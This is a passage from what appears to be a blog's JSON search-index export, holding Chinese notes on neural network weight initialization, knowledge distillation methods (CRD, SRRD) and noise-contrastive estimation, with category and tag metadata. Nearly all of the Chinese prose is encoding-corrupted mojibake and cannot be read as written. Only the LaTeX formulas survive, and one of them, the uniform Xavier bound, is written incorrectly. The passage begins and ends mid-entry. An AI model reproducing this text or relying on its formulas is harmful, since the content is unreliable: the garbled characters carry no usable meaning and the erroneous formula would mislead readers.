æ¿€æ´»å€¼çš„åˆ†å¸ƒï¼Œå—åˆ°æ¿€æ´»å‡½æ•°çš„å½¢å¼å½±å“ï¼Œè¿™æ˜¯ä¸€ä¸ªå…³é”®çš„å› ç´ ã€‚ å¯¹ç§°å‹æ¿€æ´»å‡½æ•° tanhï¼Œsigmoidç­‰å…³äºxè½´å¯¹ç§°çš„å‡½æ•°ï¼Œå¯ä»¥ä¿è¯æ¿€æ´»å€¼çš„æœŸæœ›ä¹Ÿä¸º0ã€‚è€Œæ­¤æ—¶ï¼Œæ–¹å·®çš„è®¡ç®—å¾—åˆ°ç®€åŒ–ï¼š \\[ Var(Z_l)=fan\\_in^{l} \\times \\prod_{l=1}^{L}Var(w_l) \\times Var(Z_{l-1}) \\] åŒæ—¶è€ƒè™‘åå‘ä¼ æ’­çš„è¿‡ç¨‹ï¼Œå…¶å·®å¼‚åœ¨äºfan_in å˜ä¸º fan_outï¼Œè¯¦ç»†è¿‡ç¨‹è§è®ºæ–‡ã€‚åŒæ—¶çº¦æŸå‰å‘å’Œåå‘çš„ç³»æ•°éƒ½ä¸º1ï¼Œé‚£ä¹ˆï¼Œå¯ä»¥å‡è®¾æƒé‡çš„åˆ†å¸ƒä¸º \\[ N(0, \\frac{2}{fan\\_in+fan\\_out}) \\] è‹¥ä¸ºå‡åŒ€åˆ†å¸ƒï¼Œå¯ä»¥å‡è®¾ \\[ U(-\\frac{\\sqrt{6}}{fan\\_in+fan\\_out}, \\frac{\\sqrt{6}}{fan\\_in+fan\\_out}) \\] éå¯¹ç§°åˆ†æ®µæ¿€æ´»å‡½æ•° ReLUè¿™ç±»æ¿€æ´»å‡½æ•°ï¼Œæ¿€æ´»å€¼çš„æœŸæœ›ä¸å†ä¸º0ï¼Œå…¬å¼(6)å¯ä»¥è¿›è¡Œå¦ä¸€ç§å˜æ¢ã€‚æ³¨æ„wçš„æœŸæœ›ä¾ç„¶æ˜¯æˆ‘ä»¬æ‰€å‡è®¾çš„0ï¼Œè¿™å’Œæ¿€æ´»å€¼çš„åˆ†å¸ƒæ˜¯ç‹¬ç«‹çš„ã€‚ \\[ Var(z) =fan\\_in \\times (Var(w)Var(a)+E(w)^2Var(a)+Var(w)E(a)^2)\\\\ =fan\\_in \\times (Var(w)Var(a)+Var(w)E(a)^2)\\\\ =fan\\_in \\times (Var(w)[E(a^2)-E(a)^2]+Var(w)E(a)^2)\\\\ =fan\\_in \\times Var(w) \\times E(a^2) \\] ä½•å‡¯æ˜æ¨å‡ºï¼š \\[ Var(Z_l)=\\frac{1}{2} \\times fan\\_in \\times Var(w_l) \\times Var(Z_{l-1}) \\] å‡è®¾ä¸¤å±‚ä¹‹é—´ç³»æ•°ä¸º1ï¼Œæƒé‡å¯å‡è®¾ä¸ºåˆ†å¸ƒï¼š \\[ N(0, \\frac{2}{fan\\_in}) \\] å¦‚æœæŒ‰ç…§åå‘ä¼ æ’­è®¡ç®—ï¼š \\[ N(0, \\frac{2}{fan\\_out}) \\] åœ¨caffeçš„å®ç°ä¸­ï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨ \\[ N(0, \\frac{4}{fan\\_in + fan\\_out}) \\] å½“ç„¶ä¹Ÿå¯ä»¥ä¸ä»æ¿€æ´»å‡½æ•°å…¥æ‰‹ï¼Œä½¿ç”¨Normalizationæ–¹æ³•ï¼Œå¼ºåˆ¶å˜æ¢åˆ†å¸ƒã€‚ æ¥è‡ªç¥ç»ç½‘ç»œè®­ç»ƒåŠ¨åŠ›å­¦ç ”ç©¶çš„ä¸€ç‚¹ç‚¹æ€»ç»“ ç¥ç»ç½‘ç»œå­¦ä¹ è¿‡ç¨‹ï¼Œå¯ä»¥ä»ä¿¡å·é¢‘åŸŸè§’åº¦åˆ†æã€‚ç¥ç»ç½‘ç»œæ“…é•¿å¹¶ä¸”ä¼˜å…ˆå­¦ä¹ ä½é¢‘ä¿¡å·ä¿¡æ¯ï¼Œè€Œä¸æ“…é•¿å­¦ä¹ é«˜é¢‘æŒ¯è¡ä¿¡å·ã€‚ä¹Ÿå› æ­¤ï¼Œé€šå¸¸æ¨¡å‹çš„å‚æ•°å­¦ä¹ ç»“æœæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¹³æ»‘çš„æ›²é¢ï¼ˆè¯¥ç ”ç©¶ä¸»è¦æ˜¯åœ¨æµ…å±‚ç½‘ç»œä¸Šå®éªŒï¼‰ã€‚è®ºæ–‡ä¸­è¯´ï¼Œå¦‚æ— å¿…è¦ï¼Œå‹¿å¢é¢‘ç‡ã€‚ æŠ¥å‘Šä¸­è¿˜å±•ç¤ºäº†ä¸€ç§è®¾è®¡æ€è·¯ï¼Œä»¥æé«˜ç½‘ç»œå¤„ç†é«˜é¢‘ä¿¡å·çš„èƒ½åŠ›ï¼Œå°±æ˜¯scaleåˆ°è¾ƒä½çš„å€¼åŸŸï¼Œä»¥è·å¾—ç›¸å¯¹è¾ƒå°çš„å‚æ•°ç©ºé—´ã€‚ è€Œå‚æ•°çš„åˆå§‹åŒ–ï¼Œä¸ä»…å¯¹å‚æ•°çš„é¢‘ç‡ä¿¡æ¯æœ‰å½±å“ï¼Œè¿˜å½±å“ç€æ¨¡å‹åœ¨ä¸åŒæ¡ä»¶ä¸‹çš„æ”¶æ•›é€Ÿåº¦å’Œæ”¶æ•›æ€§ï¼ˆæŠ¥å‘Šå±•ç¤ºäº†æµ…å±‚ç½‘ç»œåœ¨MNISTå®éªŒçš„ç»“æœï¼‰ã€‚ å®éªŒä¹ŸæŒ‡å‡ºäº†å¤šç§å¸¸ç”¨åˆå§‹åŒ–åœ¨è¯¥ç†è®ºä¸­ï¼Œéƒ½å…·æœ‰è¾ƒå¥½çš„æ€§èƒ½ã€‚è¿™é‡Œçš„å˜é‡å’Œå…¬å¼ï¼Œæ¯”è¾ƒå¤æ‚ï¼Œè¿™é‡Œä¹Ÿåªå…³å¿ƒäº†ç»“è®ºã€‚ å‡èšæœºåˆ¶ å¤§æ¨¡å‹è®­ç»ƒåæœŸï¼Œå‚æ•°ä¼šåå‘ç®€åŒ–å‚æ•°ç©ºé—´ï¼Œå‘æ›´å°‘çš„æ–¹å‘èšé›†å‚æ•°æ¢¯åº¦å‘é‡ï¼Œå‡ºç°è¶‹å‘ç›¸åŒæ–¹å‘çš„æƒé‡ã€‚ æ‰€ä»¥è®ºæ–‡çš„ç»“è®ºä¸ºï¼Œç¥ç»ç½‘ç»œå­˜åœ¨è¿™å°ç½‘ç»œåå¥½ï¼Œå¦‚æ— å¿…è¦ï¼Œå‹¿å¢ç¥ç»å…ƒã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"DL","slug":"Notes/DL","permalink":"https://racleray.github.io/categories/Notes/DL/"}],"tags":[{"name":"deep learning","slug":"deep-learning","permalink":"https://racleray.github.io/tags/deep-learning/"},{"name":"initialization","slug":"initialization","permalink":"https://racleray.github.io/tags/initialization/"}]},{"title":"Knowledge Distillation Note","slug":"Knowledge-Distillation-Note","date":"2021-04-18T15:39:09.000Z","updated":"2023-08-07T11:54:31.031Z","comments":true,"path":"posts/62f6fe86.html","link":"","permalink":"https://racleray.github.io/posts/62f6fe86.html","excerpt":"","text":"çŸ¥è¯†è’¸é¦æ¨¡å‹é‡‡ç”¨ç±»ä¼¼è¿ç§»å­¦ä¹ çš„æ–¹æ³•ï¼Œé€šè¿‡é‡‡ç”¨é¢„å…ˆè®­ç»ƒå¥½çš„è€å¸ˆæ¨¡å‹(Teacher modelï¼‰çš„è¾“å‡ºä½œä¸ºç›‘ç£ä¿¡å·å»è®­ç»ƒå¦å¤–ä¸€ä¸ªç®€å•çš„å­¦ç”Ÿæ¨¡å‹(Student model)ã€‚ æ‰€è°“çš„çŸ¥è¯†å°±æ˜¯ä»è¾“å…¥å‘é‡å¼•è‡³è¾“å‡ºå‘é‡çš„èŠ‚ç‚¹å›¾ã€‚ å¤§æ¦‚åˆ†ä¸ºä¸‰ç±»ï¼šçŸ¥è¯†è’¸é¦ï¼ˆæ¨¡å‹å‹ç¼©ï¼‰ï¼Œè·¨åŸŸè¿ç§»æ— æ ‡ç­¾è½¬æ¢ï¼Œé›†æˆè’¸é¦ã€‚ æ­¤å¤„å…³æ³¨çŸ¥è¯†è’¸é¦ï¼ˆæ¨¡å‹å‹ç¼©ï¼‰è¿™ä¸€ç±»ã€‚ First Step åŸæ–‡ï¼Œ ç»¼è¿° 1ã€è®­ç»ƒå¤æ‚çš„æ•™å¸ˆæ¨¡å‹ï¼ˆteacher modelï¼‰ï¼šå…ˆç”¨ç¡¬ç›®æ ‡ï¼ˆhard targetï¼‰ï¼Œä¹Ÿå°±æ˜¯æ­£å¸¸çš„æ ‡ç­¾ï¼ˆlabelï¼‰è®­ç»ƒå¤§æ¨¡å‹ã€‚ 2ã€è®¡ç®—è½¯ç›®æ ‡ï¼ˆsoft targetï¼‰ï¼šåˆ©ç”¨è®­ç»ƒå¥½çš„å¤§æ¨¡å‹æ¥è®¡ç®—è½¯ç›®æ ‡ï¼ˆsoft targetï¼‰ï¼Œä¹Ÿå°±æ˜¯å¤§æ¨¡å‹é¢„æµ‹åå†ç»è¿‡softmaxå±‚çš„è¾“å‡ºã€‚ 3ã€è®­ç»ƒå°æ¨¡å‹ï¼Œåœ¨å°æ¨¡å‹çš„åŸºç¡€ä¸Šå†åŠ ä¸€ä¸ªé¢å¤–çš„è½¯ç›®æ ‡ï¼ˆsoft targetï¼‰çš„æŸå¤±å‡½æ•°ï¼Œé€šè¿‡æƒé‡å‚æ•°æ¥è°ƒèŠ‚ä¸¤ä¸ªæŸå¤±å‡½æ•°çš„æ¯”é‡ã€‚ 4ã€é¢„æµ‹æ—¶ï¼Œå°†è®­ç»ƒå¥½çš„å°æ¨¡å‹æ¥è¿›è¡Œå®éªŒã€‚ è½¯ç›®æ ‡ï¼ˆsoft targetï¼‰ï¼Œå°½é‡æé«˜å¤æ‚æ¨¡å‹é‡Œçš„ä¿¡æ¯é‡ï¼Œä¹Ÿå°±æ˜¯ç†µã€‚ ç¦»æ•£çš„æ•°æ®åœ¨ç­‰æ¦‚çš„æƒ…å†µä¸‹ç†µå€¼æ˜¯æœ€å¤§çš„ï¼Œåœ¨åˆ†ç±»çš„è¿‡ç¨‹ä¸­ï¼Œè¦å°½é‡è´´è¿‘ä¸ç­‰æ¦‚ç‡çš„æƒ…å†µï¼Œè¿™æ ·å°±å¯ä»¥ä½¿å¾—è½¯ç›®æ ‡ï¼ˆsoft targetï¼‰åœ¨æ¯æ¬¡è®­ç»ƒçš„è¿‡ç¨‹ä¸­è·å¾—æ›´å¤šçš„ä¿¡æ¯å’Œæ›´å°çš„æ¢¯åº¦æ–¹å·®ï¼Œå°æ¨¡å‹å¯ä»¥ç”¨æ›´å°‘çš„æ•°æ®å’Œæ›´å°çš„å­¦ä¹ ç‡æ¥è¿›è¡Œè®­ç»ƒï¼Œè¿›ä¸€æ­¥å‹ç¼©ã€‚ æ–¹æ³•åˆ†ç±»ï¼š æ¨¡å‹ä¼ é€’è®­ç»ƒé›†æˆç®—æ³•ï¼šè®­ç»ƒå­¦ç”Ÿæ¨¡å‹ï¼Œä½¿å…¶å‚æ•°å’Œæ•™å¸ˆæ¨¡å‹ä¸€æ ·ï¼Œè€Œä¸æ˜¯å‹ç¼©æ¨¡å‹ã€‚å¦‚å›¾ï¼Œä»æ•™å¸ˆè®­ç»ƒå­¦ç”Ÿ1ï¼Œä»¥æ­¤ç”±å­¦ç”Ÿiè®­ç»ƒå­¦ç”Ÿi+1ï¼Œæœ€åé›†æˆæ‰€æœ‰çš„å­¦ç”Ÿæ¨¡å‹ã€‚ äº¤æ›¿å¼è®­ç»ƒæ¨¡å‹ç®—æ³•ï¼šé‡‡ç”¨å¤šä¸ªç½‘ç»œåŒæ—¶è¿›è¡Œè®­ç»ƒï¼Œæ¯ä¸ªç½‘ç»œåœ¨è®­ç»ƒè¿‡ç¨‹ä¸­ä¸ä»…æ¥å—æ¥è‡ªçœŸå€¼æ ‡è®°çš„ç›‘ç£ï¼Œè¿˜å‚è€ƒåŒä¼´ç½‘ç»œçš„å­¦ä¹ ç»éªŒæ¥è¿›ä¸€æ­¥æå‡æ³›åŒ–èƒ½åŠ›ã€‚åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œä¸¤ä¸ªç½‘ç»œä¹‹é—´ä¸æ–­åˆ†äº«å­¦ä¹ ç»éªŒï¼Œå®ç°äº’ç›¸å­¦ä¹ å…±åŒè¿›æ­¥ã€‚ä¸¤ä¸ªç½‘ç»œçš„ä¼˜åŒ–æ˜¯è¿­ä»£è¿›è¡Œçš„ï¼Œç›´åˆ°æ”¶æ•›ã€‚ ç‰¹å¾è¡¨ç¤ºè®­ç»ƒï¼šä½¿ç”¨å›å½’æ¨¡å—æ¥é…å‡†éƒ¨åˆ†å­¦ç”Ÿç½‘ç»œå’Œéƒ¨åˆ†æ•™å¸ˆç½‘ç»œçš„è¾“å‡ºç‰¹å¾ï¼Œå¹¶ä¸”å¯¹è¾“å‡ºç‰¹å¾è¿›è¡Œå¤„ç†ï¼Œå¯ä»¥å°†ç½‘ç»œå¤„ç†çš„é‡ç‚¹æ”¾åœ¨å¾—åˆ°ç›¸ä¼¼çš„ç‰¹å¾å±‚ã€‚ è‡ªæ³¨æ„åŠ›è’¸é¦ç®—æ³•ï¼šSelf Attention Distillationï¼Œç§°ä¸ºSADã€‚å¯¹äºå¤šé€šé“çš„ä¸»åŠ›æ„å›¾æœ‰ä¸‰ç§æ–¹æ³•ï¼š1.ç»å¯¹å€¼æ±‚å’Œï¼›2.ç»å¯¹å€¼æŒ‡æ•°æ±‚å’Œï¼ŒæŒ‡æ•°å¤§äº1ï¼›3.ç»å¯¹å€¼æŒ‡æ•°æ±‚æœ€å¤§å€¼ã€‚è®©æµ…å±‚ç‰¹å¾æ¥å­¦ä¹ é«˜å±‚ç‰¹å¾çš„è¡¨è¾¾ï¼Œä»è€ŒåŠ å¼ºç½‘ç»œçš„æ•´ä½“ç‰¹å¾è¡¨è¾¾èƒ½åŠ›ã€‚è¿™ç§åº•å±‚ç‰¹å¾æ¨¡ä»¿é«˜å±‚ç‰¹å¾çš„å­¦ä¹ è¿‡ç¨‹ï¼Œå±äºè‡ªæ³¨æ„åŠ›è’¸é¦(Self Attention Distillation)ã€‚ æ­¤å¤„æ›´å…³æ³¨ç‰¹å¾è¡¨ç¤ºè®­ç»ƒè¿™ä¸€ç±»ã€‚NLPä¸­ç”¨çš„æœ€å¤šçš„ä¸€äº›æ–¹æ³•ä¹Ÿæ¥è‡ªè¿™ä¸€ç±»ã€‚æ¯”å¦‚ï¼šDistilBERTå­¦ä¹ æœ€åä¸€å±‚çš„è¡¨ç¤ºã€‚PKDBERTï¼ˆPatient Knowledge Distillationï¼‰åŒæ—¶å­¦ä¹ ä¸­é—´å±‚çš„è¡¨ç¤ºã€‚TinyBERTå°†embeddingå±‚ä¹Ÿçº³å…¥å­¦ä¹ çš„èŒƒç•´ã€‚åŒæ—¶å…³æ³¨æ–°çš„åŸºäºå¯¹æ¯”å­¦ä¹ çš„æ–¹æ³•ã€‚ Contrastive Representation Distillation è®ºæ–‡ï¼Œ Git åŸºæœ¬å‡è®¾ï¼ŒçŸ¥è¯†è’¸é¦åº”è¯¥è¦è¿ç§»çš„æ˜¯è¡¨å¾representationï¼Œè€Œä¸æ˜¯æ¦‚ç‡åˆ†å¸ƒï¼ˆä¸ç®¡æ˜¯ä½¿ç”¨KLæ•£åº¦è¿˜æ˜¯L2è·ç¦»ï¼‰ã€‚åŒæ—¶ä¹‹å‰çš„ä¸æ˜¯åŸºäºå¯¹æ¯”å­¦ä¹ çš„æ–¹æ³•ï¼Œä¼šä¸¢å¤±Teacheræ¨¡å‹è¾“å‡ºè¡¨å¾representationçš„ç»“æ„ä¿¡æ¯ï¼Œå³å¿½ç•¥äº†ç»´åº¦é—´æœ‰å¾ˆå¤æ‚çš„ä¾èµ–å…³ç³»ã€‚ å› ä¸ºKLæ•£åº¦æˆ–è€…L2è·ç¦»è®¡ç®—å°†æ¯ä¸ªç»´åº¦è®¤ä¸ºæ˜¯ç‹¬ç«‹çš„ï¼Œåœ¨è¡¨å¾å­¦ä¹ ä¸­ï¼Œå¾ˆéš¾ä¿è¯è¿™é‡Œçš„ç‹¬ç«‹å‡è®¾æ˜¯å®Œæˆæˆç«‹çš„ã€‚ ç¬¦å·å®šä¹‰ï¼š è¿™é‡Œ \\(Z^T=W_T(T), Z^S=W_S(S)\\), \\(\\sigma\\) ä¸º softmax å‡½æ•°ã€‚ æŸå¤±å‡½æ•°ï¼š ä¸¤ä¸ªHè¡¨ç¤ºä¸åŒçš„å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªè¡¨ç¤ºäº¤å‰ç†µï¼ˆæ ‡ç­¾ï¼‰ï¼Œç¬¬äºŒä¸ªè¡¨ç¤ºKLæ•£åº¦ï¼ˆè¡¨å¾ï¼‰ã€‚ å¯¹æ¯”å­¦ä¹ å¼•å…¥ Så’ŒTçš„è¾“å…¥æ˜¯ç›¸åŒçš„æ—¶ï¼Œè¡¨å¾åº”è¯¥ç›¸ä¼¼ã€‚Så’ŒTçš„è¾“å…¥æ˜¯ä¸åŒçš„æ—¶ï¼Œè¡¨å¾åº”è¯¥ä¸åŒã€‚ åŒæ—¶è¡¡é‡è¡¨å¾å·®å¼‚çš„æ–¹æ³•ï¼Œå˜ä¸ºNCEï¼Œä»è€Œå¼•å…¥çš„è´Ÿä¾‹ï¼Œå³ å¯¹æ¯”å­¦ä¹ çš„ç›®æ ‡å‡½æ•°ä¸ºï¼š å¦‚æœåªæ˜¯ä½¿ç”¨è¯¥æ–¹æ³•ï¼Œé‚£åˆ°æ­¤å·²ç»å¯ä»¥ç”¨äº†ã€‚ ç›®æ ‡å‡½æ•°æ¨å¯¼ å‡è®¾ï¼ŒSå’ŒTçš„è¾“å…¥æ˜¯ç›¸åŒæ—¶ï¼ŒC=1(T, SåŒåˆ†å¸ƒ)ï¼Œå¦åˆ™C=0(T, Sä¸åŒåˆ†å¸ƒ)ã€‚æœ‰1ä¸ªç›¸å…³è¾“å…¥å¯¹ï¼ŒNä¸ªæ— å…³è¾“å…¥å¯¹ï¼ŒMä¸ºæ•°æ®é›†çš„å¤§å°ã€‚ è®¡ç®—\\(q(C=1|T,S)\\): å–å¯¹æ•°ï¼ŒåŒæ—¶ä¹˜ä¸Š-1ï¼š äº¤æ¢ log(N) é¡¹ï¼Œä¸¤è¾¹æŒ‰p(T,S)æ±‚ç§¯åˆ†ï¼š å®šä¹‰ï¼š å¼•å…¥NCEï¼Œä¸ç­‰å¼å³è¾¹å†™æˆï¼š è®¾ \\(h^*(T, S)=q(C=1|T,S), h^*=argmax\\ L_{critic}(h)\\) ç”±äº \\(h^*\\) æ˜¯æå¤§å€¼ç‚¹ï¼Œæ‰€ä»¥ï¼Œä¸€èˆ¬æ€§çš„ \\(h\\) éƒ½æœ‰ä¸‹å¼æˆç«‹: å…¶ä¸­hä¸ºï¼š æ‰€ä»¥æ–¹æ³•å°±æ˜¯å…ˆæ‰¾åˆ° Tå’ŒS è¡¨å¾çš„äº’ä¿¡æ¯çš„ä¸Šç•Œï¼Œç„¶åï¼Œä¼˜åŒ–studentæ¨¡å‹ï¼Œä½¿å¾—äº’ä¿¡æ¯å…³äºSçš„ä¸‹ç•Œæœ€å¤§ï¼Œå¾—åˆ°æœ€ä¼˜çš„å­¦ç”Ÿæ¨¡å‹ã€‚ Softmax Regression Representation Distillation è®ºæ–‡ï¼ŒGit æ–¹æ³•åŸºæœ¬å¦‚å›¾æ‰€ç¤ºï¼Œå°±æ˜¯è®¾è®¡äº†ä¸‰ç§æŸå¤±ç›¸åŠ ã€‚ works slightly better than the cross-entropy loss. ç›¸å¯¹è€Œè¨€ï¼Œæ²¡æœ‰è®¾è®¡å¯¹æ¯”å­¦ä¹ ï¼Œä½†æ˜¯è®ºæ–‡å®éªŒç»“æœè¿˜æ˜¯ä¸é”™çš„ï¼Œç›¸æ¯”ä¸Šä¸€èŠ‚CRDæ–¹æ³•ï¼Œç®€å•ä¸å°‘ï¼Œä½†æ˜¯æ•ˆæœä¹Ÿä¸é”™ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Distillation","slug":"Notes/Distillation","permalink":"https://racleray.github.io/categories/Notes/Distillation/"}],"tags":[{"name":"knowledge distillation","slug":"knowledge-distillation","permalink":"https://racleray.github.io/tags/knowledge-distillation/"},{"name":"CRD","slug":"CRD","permalink":"https://racleray.github.io/tags/CRD/"},{"name":"SRRD","slug":"SRRD","permalink":"https://racleray.github.io/tags/SRRD/"}]},{"title":"å†çœ‹NCE","slug":"å†çœ‹NCE","date":"2021-04-08T15:41:42.000Z","updated":"2023-08-07T11:54:31.039Z","comments":true,"path":"posts/68340e67.html","link":"","permalink":"https://racleray.github.io/posts/68340e67.html","excerpt":"","text":"æ¦‚ç‡è¯­è¨€æ¨¡å‹ï¼Œå¦‚æœ€å¤§ç†µæ¨¡å‹å’Œæ¦‚ç‡ç¥ç»æ¨¡å‹ï¼Œåœ¨å‚æ•°ä¼°è®¡æ—¶ï¼Œéƒ½æœ‰è®¡ç®—é‡å¤§çš„é—®é¢˜ï¼Œè¯æ±‡è¡¨å®åœ¨æ˜¯å¤ªå¤§äº†ã€‚è¿™è®©é…åˆ†å‡½æ•°çš„è®¡ç®—é‡å¤§å¾—å°±æƒ³ä¼˜åŒ–å®ƒã€‚ åªçœ‹NCEå’ŒNegative Samplingï¼ˆä»¥ä¸‹ç®€å†™ä¸ºNSï¼‰ï¼Œå°±ä¸è¯´å…¶ä»–çš„æ–¹æ³•äº†ã€‚ NCEå’ŒNSåˆšæ¥è§¦æ—¶ï¼Œçœ‹ç€å¥½åƒä¸€æ ·ä¸€æ ·çš„ã€‚å†çœ‹ï¼Œè¿˜çœŸæ˜¯å¤§æ„äº†ï¼Œä¸å¤Ÿä¸¥è°¨ã€‚ï¼ˆåºŸè¯çœŸå¤šï¼‰ æ ‡å‡†å¼€å¤´ å‡è®¾ä»¥ä¸‹æ˜¯ä¸€ä¸ªæ¨¡å‹ï¼Œæ ¹æ®ä¸Šä¸‹æ–‡ \\(c\\) é¢„æµ‹è¯è¡¨ \\(V\\) ä¸­çš„è¯ \\(w\\)ã€‚ \\[ p_{\\theta}(w \\mid c)=\\frac{u_{\\theta}(w, c)}{\\sum_{w^{\\prime} \\in V} u_{\\theta}\\left(w^{\\prime}, c\\right)}=\\frac{u_{\\theta}(w, c)}{Z_{\\theta}(c)} \\] å‡è®¾ \\(u_\\theta = \\exp(s_\\theta(w, c))\\)ï¼Œ\\(Z_\\theta(c)\\)è‡ªç„¶æ˜¯é…åˆ†å‡½æ•°ã€‚\\(s_\\theta\\) å‡è®¾æ˜¯ä¸€ä¸ªå¯å¾®çš„å‡½æ•°ã€‚ å¦‚æœäº†è§£æ¦‚ç‡å›¾æ¨¡å‹ï¼Œåº”è¯¥è§è¿‡ä½¿ç”¨ Importance Sampling + MC çš„æ–¹å¼è¿‘ä¼¼é…åˆ†å‡½æ•°çš„æœŸæœ›çš„æ³•å­ã€‚NCEèµ°å¾—å°±æ˜¯è¿™æ¡è·¯ï¼Œåªæ˜¯ç¨ç¨æ”¹è¿›äº†äº›ã€‚ å…¶ä»–å®šä¹‰ï¼š ç»éªŒåˆ†å¸ƒè¡¨ç¤ºä¸º \\(\\hat{p}(w|c)\\) å’Œ \\(\\hat{p}(c)\\) æ¨¡å‹è¡¨ç¤ºçš„åˆ†å¸ƒ\\(p_\\theta(w|c)\\) NCEçš„ç›®çš„å°±æ˜¯é€šè¿‡ä¸€ä¸ª å™ªå£°åˆ†å¸ƒ \\(q(w)\\) ï¼ˆwçš„å‡åŒ€åˆ†å¸ƒï¼Œä¹Ÿå¯ä»¥æ˜¯å¯¹æ¯ä¸ªæ¦‚ç‡å–å¹‚0&lt; Î± &lt;1å’Œå†normalizeå¾—åˆ°ï¼‰ï¼Œå¾—åˆ°é…åˆ†å‡½æ•°çš„æ¸è¿›æ— åä¼°è®¡ã€‚ NCE æ–¹æ³•ï¼šé€šè¿‡å»ºç«‹äºŒåˆ†ç±»æ¨¡å‹ï¼ŒåŒºåˆ†æ¥è‡ªç»éªŒåˆ†å¸ƒï¼ˆè®­ç»ƒæ•°æ®ï¼‰å’Œå™ªå£°åˆ†å¸ƒçš„æ•°æ®ï¼Œå¾—åˆ°æœ€ä¼˜çš„æ¨¡å‹å‚æ•°ï¼Œå°±æ˜¯éœ€è¦çš„å‚æ•°æ±‚è§£ç»“æœã€‚ æ•°æ®ç”Ÿæˆ Label d = ï½›0ï¼Œ1ï½ï¼Œè¡¨ç¤ºæ•°æ®å±äºå™ªå£°æˆ–è€…çœŸå®æ•°æ®ã€‚åˆ†å¸ƒè¡¨ç¤ºä¸ºï¼š \\[ p(d, w \\mid c)=\\left\\{\\begin{array}{ll} \\frac{k}{1+k} \\times q(w) &amp; \\text { if } d=0 \\\\ \\frac{1}{1+k} \\times \\tilde{p}(w \\mid c) &amp; \\text { if } d=1 \\end{array}\\right. \\] è½¬æ¢æˆ d å…³äº c å’Œ w çš„æ¡ä»¶åˆ†å¸ƒï¼ˆå®šä¹‰ç›´æ¥æ¨å¯¼ï¼‰ï¼š \\[ \\begin{aligned} p(d=0 \\mid c, w) &amp;=\\frac{\\frac{k}{1+k} \\times q(w)}{\\frac{1}{1+k} \\times \\tilde{p}(w \\mid c)+\\frac{k}{1+k} \\times q(w)} \\\\ &amp;=\\frac{k \\times q(w)}{\\tilde{p}(w \\mid c)+k \\times q(w)} \\\\ p(d=1 \\mid c, w) &amp;=\\frac{\\tilde{p}(w \\mid c)}{\\tilde{p}(w \\mid c)+k \\times q(w)} \\end{aligned} \\] ä»¥ä¸Šæ˜¯æ„å»ºçš„\"proxy corpus\"ä»£ç†çš„è®­ç»ƒæ•°æ®åˆ†å¸ƒï¼Œé‚£ä¹ˆæŠŠæ¨¡å‹æ‹Ÿåˆçš„åˆ†å¸ƒ\\(p_\\theta(w|c)\\)å¸¦å…¥ï¼Œæ›¿æ¢æ‰ç»éªŒåˆ†å¸ƒ \\(\\hat{p}(w|c)\\)ï¼Œå°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªå¯ä»¥æ“ä½œçš„ç›®æ ‡ã€‚ æ–¹æ³• ä½†æ˜¯ï¼Œ\\(\\hat{p}(w|c)\\)è¿˜æ˜¯æœ‰ \\(Z_\\theta(c)\\) å•Šï¼Œè¿™ä¸ç›¸å½“äºæ„é€ è¿™ä¹ˆå¤šéƒ½ç™½å¹²äº†ï¼Ÿ æ‰€ä»¥NCEç»§ç»­æ”¹è¿›ï¼Œå°† \\(Z_\\theta(c)\\) æ•´ä½“ä½†åšä¸€ä¸ªå…³äº c çš„å‚æ•°ï¼Œå‚æ•°åŒ–ã€‚ç„¶åä¸€é€šæ“ä½œï¼Œå‘ç°åœ¨ç¥ç»ç½‘ç»œæ¨¡å‹è¿™ç§å‚æ•°å·¨å¤šçš„æƒ…å†µä¸‹ï¼Œå°† \\(Z_\\theta(c)\\) ç›´æ¥è®¾ä¸º 1 ï¼Œåè€Œæ˜¯ä¸€ç§æœ‰æ•ˆä¸”é«˜æ•ˆçš„åšæ³•ï¼Œæ–‡ç« é‡Œå«åš self-normalizedã€‚ æ‰€ä»¥ï¼Œå¾—åˆ°çš„å…³äº å‚æ•° \\(\\theta\\) çš„åˆ†å¸ƒè¡¨ç¤ºä¸ºï¼š \\[ \\begin{aligned} p(d=0 \\mid c, w) &amp;=\\frac{k \\times q(w)}{u_{\\theta}(w, c)+k \\times q(w)} \\\\ p(d=1 \\mid c, w) &amp;=\\frac{u_{\\theta}(w, c)}{u_{\\theta}(w, c)+k \\times q(w)} \\end{aligned} \\] ç›´æ¥æ“ä½œæ‰äº†æ±‚å’Œé…åˆ†é¡¹ã€‚ç›®æ ‡ä¹Ÿå˜æˆäº†ä¸€ä¸ªäºŒåˆ†ç±»ï¼š \\[ \\mathcal{L}_{\\mathrm{NCE}_{k}}=\\sum_{(w, c) \\in \\mathcal{D}}\\left(\\log p(d=1 \\mid c, w)+k \\mathbb{E}_{\\bar{w} \\sim q} \\log p(d=0 \\mid c, \\bar{w})\\right) \\] åªæ˜¯ï¼Œå…¶ä¸­æ±‚æœŸæœ›çš„éƒ¨åˆ†éœ€è¦æ‰€æœ‰å•è¯åœ¨å™ªå£°åˆ†å¸ƒä¸‹æ±‚å€¼ï¼Œå¾—åˆ°æœŸæœ›ï¼Œè¿™æ˜¾ç„¶æ˜¯ä½æ•ˆçš„ã€‚ç®€å•çš„åŠæ³•ï¼Œç›´æ¥MCï¼ŒæœŸæœ›è½¬Samplingï¼š \\[ \\begin{aligned} \\mathcal{L}_{\\mathrm{NCE}_{k}}^{\\mathrm{MC}} &amp;=\\sum_{(w, c) \\in \\mathcal{D}}\\left(\\log p(d=1 \\mid c, w)+k \\times \\sum_{i=1, \\bar{w} \\sim q}^{k} \\frac{1}{k} \\times \\log p(d=0 \\mid c, \\bar{w})\\right) \\\\ &amp;=\\sum_{(w, c) \\in \\mathcal{D}}\\left(\\log p(d=1 \\mid c, w)+\\sum_{i=1, \\bar{w} \\sim q}^{k} \\log p(d=0 \\mid c, \\bar{w})\\right) \\end{aligned} \\] å®Œ å¯ä»¥è¯æ˜ï¼ˆæ±‚æå€¼ç‚¹å˜›ï¼Œå†åˆ†æä¸€æ³¢kè¶‹äºæ— ç©·çš„æé™ï¼‰ï¼Œè¿™ä¸ªç›®æ 